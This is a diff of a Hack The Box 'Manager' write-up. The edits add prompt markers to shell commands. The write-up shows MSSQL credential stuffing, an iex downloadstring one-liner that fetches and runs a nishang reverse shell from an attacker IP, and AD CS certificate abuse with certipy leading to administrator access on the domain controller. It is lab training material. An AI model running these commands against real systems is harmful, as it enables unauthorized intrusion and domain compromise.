@@ -189,7 +189,7 @@ operator
 
 Next, attempt a credential stuffing attack in the mssql database using this wordlist.
 ```markdown
-crackmapexec mssql manager.htb -u ./wordlist -p ./wordlist
+> crackmapexec mssql manager.htb -u ./wordlist -p ./wordlist
 ```
 Attack is successful for credentials `operator:operator`
 
@@ -266,17 +266,17 @@ Opening the `.zip` file, we find an `.xml` with credentials.
 
 We use them to log in with `evil-winrm`
 ```markdown
-evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123'  -i 10.129.142.151
+> evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123'  -i 10.129.142.151
 ```
 This shell allows us to collect `user.txt`
 ### PHASE 3. System
 First step is to upgrade the shell to a nishang interactive shell.
 ```markdown
-powershell "iex(new-object net.webclient).downloadstring('http://10.10.14.69/Invoke-PowerShellTcp.ps1')"
+> powershell "iex(new-object net.webclient).downloadstring('http://10.10.14.69/Invoke-PowerShellTcp.ps1')"
 ```
 Next, enumerate the system from the powershell.
 ```powershell
-get-computerinfo
+> get-computerinfo
 WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
 WindowsCurrentVersion                                   : 6.3
 WindowsProductName                                      : Windows Server 2019 Standard
@@ -286,10 +286,10 @@ Enumerate principal rights with `certify.exe`
 
 ![manager5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/07a54637-4a5a-4ac5-adbf-0cbfcdc83654)
 
-It seems user `rave`n` has privileges to manage the CA. A walkthrough to exploit this vulnerability can be found here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
+It seems user `raven` has privileges to manage the CA. A walkthrough to exploit this vulnerability can be found here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2
 First step is to grant yourself the Manage Certificates access right by adding your user as a new officer.
 ```markdown
-/usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.142.151 -add-officer raven
+> /usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.142.151 -add-officer raven
 
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
@@ -297,7 +297,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 ```
 The SubCA template can be enabled on the CA with the `-enable-template parameter`. By default, the SubCA template is enabled.
 ```markdown
-/usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+> /usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
 
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
@@ -305,7 +305,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 ```
 We start by requesting a certificate based on the SubCA template. This request will be denied, but we will save the private key and note down the request ID. make sure you are running the command from a directory where you have writing rights, otherwise the `.key` will not be written.
 ```markdown
-/usr/bin/certipy-ad req -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target manager.htb -template SubCA -upn administrator@manager.htb
+> /usr/bin/certipy-ad req -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target manager.htb -template SubCA -upn administrator@manager.htb
 
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
@@ -315,13 +315,13 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 Would you like to save the private key? (y/N) y
 [*] Saved private key to 21.key
 [-] Failed to request certificate# we can then issue the failed certificate request with the ca command and the -issue-request <request ID> parameter
-/usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -issue-request 21 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+> /usr/bin/certipy-ad ca -ca 'manager-DC01-CA' -issue-request 21 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
 
 [*] Successfully issued certificate
 ```
 In this case, private key is saved as `21.key`. Next, retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.
 ```markdown
-/usr/bin/certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 21
+> /usr/bin/certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 21
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
 [*] Rerieving certificate with ID 21
@@ -334,13 +334,13 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 We can use this certificate to obtain a tgt ticket with `certipy`. This is known as a pass-the-certificate attack (https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate).
 In order for this to work, synchronization with dc clock is needed to avoid clock skew too great. This can be done with ntpdate
 ```markdown
-sudo ntpdate -u 10.129.142.151
+> sudo ntpdate -u 10.129.142.151
 2023-10-22 16:28:37.84492 (-0400) +25184.364655 +/- 0.061746 10.129.142.151 s1 no-leap
 CLOCK: time stepped by 25184.364655
 ```
 Using the administrator certificate that we have just created, generate a kerberos tgt ticket.
 ```markdown
-/usr/bin/certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.129.142.151 -username administrator -domain manager.htb
+> /usr/bin/certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.129.142.151 -username administrator -domain manager.htb
 
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
@@ -354,11 +354,11 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 At this point, you can have a full interactive system shell either passing the administrator hash or passing the tgt ticket.
 To pass the hash, you can use `psexec` or similar tool. To pass the ticket, first export the ticket to prepare a pass the ticket attack.
 ```markdown
-export KRB5CCNAME=administrator.ccache
+> export KRB5CCNAME=administrator.ccache
 ```
 Then login to dc using passing the tgt ticket.
 ```markdown
-python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.129.142.151 -target-ip 10.129.142.151
+> python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.129.142.151 -target-ip 10.129.142.151
 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
